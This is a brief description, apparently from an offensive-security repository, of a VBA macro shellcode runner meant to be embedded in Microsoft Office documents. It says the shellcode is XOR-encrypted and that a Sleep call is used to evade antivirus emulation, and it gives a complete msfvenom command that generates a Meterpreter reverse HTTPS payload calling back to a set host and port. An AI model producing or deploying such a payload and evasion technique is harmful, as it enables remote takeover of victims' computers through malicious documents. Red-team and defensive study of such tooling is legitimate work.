  Shellcode runner in a VBA macro can be used inside a Office product. This code make use of encrypted shellcode with XOR and has a Sleep function which ensures that it is not tested against an AV emulator.

  Command Reference:

  	byte[] buf: msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.13.37 LPORT=443 EXITFUNC=thread -f csharp --encrypt xor --encrypt-key a
